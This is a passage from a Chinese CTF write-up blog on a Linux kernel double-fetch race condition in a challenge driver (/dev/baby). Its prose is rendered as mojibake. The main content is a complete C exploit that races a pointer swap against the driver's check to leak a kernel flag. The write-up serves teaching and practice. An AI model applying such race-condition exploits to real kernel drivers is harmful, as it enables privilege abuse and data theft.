<p>å¦‚ä¸Šæ‰€çŸ¥,å½“ä¸”ä»…å½“<br><img src="/2020/04/30/kernel-%C2%96%C2%96D-ublele-Fetch%E8%AF%A6%E8%A7%A3/3.jpg" alt><br>å½“ç¬¬ä¸€çº¿ç¨‹è¿è¡Œåˆ°Aå¤„,ç¬¬äºŒçº¿ç¨‹æ›´æ”¹bufçš„æŒ‡é’ˆä¸ºflagçš„æŒ‡é’ˆ.æ­¤æ—¶æ¡ä»¶æˆç«‹,åœ¨å†…æ ¸ç¼“å†²åŒºå†…å¯ä»¥æ‰¾åˆ°flag.<br>æ‰€ä»¥è„šæœ¬æˆåŠŸå…·æœ‰å¶ç„¶æ€§,è¦å¤šåŠ å°è¯•.</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int finish = 0;</span><br><span class="line">struct message&#123;</span><br><span class="line">    char * buf;</span><br><span class="line">    long len;</span><br><span class="line">&#125;;</span><br><span class="line">struct message my_message;</span><br><span class="line">void change_attr_value(unsigned long addr)&#123;</span><br><span class="line">    while(finish==0)&#123;</span><br><span class="line">	puts(&quot;changing&quot;);</span><br><span class="line">    my_message.buf = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/baby&quot;,0);</span><br><span class="line">    ioctl(fd,0x6666);</span><br><span class="line">    system(&quot;dmesg &gt; /tmp/record.txt&quot;);</span><br><span class="line">    int tmp_fd = open(&quot;/tmp/record.txt&quot;,O_RDONLY);</span><br><span class="line">    char temp[0x1000];</span><br><span class="line">    lseek(tmp_fd,-0x100,SEEK_END);</span><br><span class="line">    read(tmp_fd,temp,0x100);</span><br><span class="line">    char * idx = strstr(temp,&quot;Your flag is at &quot;);</span><br><span class="line">    if (idx == 0)&#123;</span><br><span class="line">        printf(&quot;[-]Not found addr&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">	close(tmp_fd);</span><br><span class="line">    idx+=16;</span><br><span class="line">    unsigned long addr = strtoull(idx,idx+16,16);</span><br><span class="line">    </span><br><span class="line">    puts(&quot;------addr----------&quot;);</span><br><span class="line">    printf(&quot;%p\n&quot;,addr);</span><br><span class="line">    my_message.buf = temp;</span><br><span class="line">    my_message.len = 33;</span><br><span class="line">	pthread_t t1;</span><br><span class="line">	pthread_create(&amp;t1,NULL,change_attr_value,addr);</span><br><span class="line">    for (int i = 0 ; i &lt; 3000; i++)&#123;</span><br><span class="line">		my_message.buf = temp;</span><br><span class="line">        ioctl(fd,0x1337,&amp;my_message);</span><br><span class="line">    &#125;</span><br><span class="line">	finish = 1;</span><br><span class="line">	system(&quot;dmesg | grep THIS&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ¡ä»¶ç«äº‰ç›¸å¯¹éš¾å¯Ÿè§‰ï¼Œå¹¶ä¸”åœ¨å¤ç°å’Œè°ƒè¯•æ–¹é¢ä¼šæ¯”è¾ƒå›°éš¾ã€‚æ¡ä»¶ç«äº‰é€ æˆçš„å½±å“ä¹Ÿæ˜¯å¤šæ ·çš„.è‡³å°‘åœ¨kernelæ–¹é¢ã€‚è¦å­¦ä¼šçµæ´»è¿ç”¨ã€‚<br><a href="https://wiki.x10sec.org/pwn/race-condition/introduction/" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a>  </p>
</div><div class="tags"><a href="/tags/Kernel/">Kernel</a></div><div class="post-nav"><a class="pre" href="/2020/05/24/GKCTF-pwn-Domo/">GKCTF_pwn_Domo(å‡ºé¢˜äººè§’åº¦)</a><a class="next" href="/2020/04/27/%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E8%B5%9BPWN/">å®‰æ’å››æœˆèµ›PWN</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' ? true : false;
var verify = 'false' ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'AXNWQSAnzhoRuAsbsdqT84uQ-gzGzoHsz',
  appKey:'EcvRS3Hc6zidBU6GIBE3xBJN',
  placeholder:'Just so so',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/Kernel/" style="font-size: 15px;">Kernel</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 15px;">æ€»ç»“</a> <a href="/tags/%E5%A0%86/" style="font-size: 15px;">å †</a> <a href="/tags/WINPWN/" style="font-size: 15px;">WINPWN</a> <a href="/tags/MSF/" style="font-size: 15px;">MSF</a> <a href="/tags/angr/" style="font-size: 15px;">angr</a> <a href="/tags/arm/" style="font-size: 15px;">arm</a> <a href="/tags/%E6%A0%88/" style="font-size: 15px;">æ ˆ</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 15px;">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/2020%E4%B8%8A%E6%B5%B7%E9%82%80%E8%AF%B7%E8%B5%9B%E5%88%9D%E8%B5%9BPWNWN-wp/">2020ä¸Šæµ·é‚€è¯·èµ›åˆèµ›PWN-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AFPWN%E9%83%A8%E5%88%86W/">2020æ¹–æ¹˜æ¯PWNéƒ¨åˆ†WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/MSF%E5%85%8D%E6%9D%80%F0%9F%90%8E%E5%88%B6%E4%BD%9C/">MSFå…æ€ğŸ</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/09/%E6%9F%90%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/">æŸæ¹–è®ºå‰‘éƒ¨åˆ†pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/">åå­—å«å•¥</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/03/2020WMCTFTF-cfgo-CheckIn/">2020WMCTF_cfgo_CheckIn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/DASCTF-7%E6%9C%88pwn/">DASCTF 7æœˆéƒ¨åˆ†pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/01/%E6%9F%90%E5%A0%86%E5%A4%8D%E7%8E%B0-getchar%E5%BC%95%E5%8F%91malloc/">æŸå †å¤ç°(getcharå¼•å‘malloc)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/22/angr%E5%88%9D%E6%8E%A2/">angråˆæ¢</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/03/RCTF-no-write/">RCTF no_write</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://whali3n51.github.io/" title="whali3n51" target="_blank">whali3n51</a><ul></ul><a href="http://www.pdsdt.lovepdsdt.com/" title="Pdsdt" target="_blank">Pdsdt</a><ul></ul><a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a><ul></ul><a href="https://www.mydamya.top/" title="Damya" target="_blank">Damya</a><ul></ul><a href="http://phoebe233.cn/" title="W4nder" target="_blank">W4nder</a><ul></ul><a href="https://yojrevo.github.io/" title="yojrevo" target="_blank">yojrevo</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright Â© 2020 <a href="/." rel="nofollow">starssgo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>